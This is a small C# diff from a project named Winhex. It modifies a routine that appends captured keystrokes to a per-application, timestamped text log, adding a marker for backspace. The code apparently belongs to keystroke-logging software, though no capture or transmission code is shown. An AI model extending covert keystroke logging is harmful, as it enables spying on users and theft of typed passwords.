@@ -56,7 +56,8 @@ namespace Winhex.Models
                     _lastAction = new UserAction() {ActionDateTime = DateTime.Now, AppTitle = appTitle};
                 }
 
-                _lastAction.TextLog += key;
+                if (key == '`') _lastAction.TextLog += " [bs] ";
+                else _lastAction.TextLog += key;
             }
             catch { }
         }
